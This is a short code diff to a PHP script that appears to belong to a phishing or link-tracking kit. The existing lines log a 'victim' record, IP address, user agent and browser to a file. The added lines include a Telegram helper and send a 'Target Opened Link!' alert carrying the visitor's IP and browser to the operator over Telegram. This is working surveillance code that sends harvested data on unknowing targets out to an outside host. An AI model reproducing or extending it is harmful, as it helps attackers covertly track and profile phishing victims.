@@ -1,4 +1,6 @@
 <?php
+include 'telegram_helper.php';
+
 
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
@@ -24,6 +26,12 @@ fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
+
+$message = "<b>Target Opened Link!</b>\n";
+$message .= "IP: <code>" . trim($ipaddress) . "</code>\n";
+$message .= "User Agent: " . $browser;
+sendTelegramMessage($message);
+
 
 
 fclose($fp);
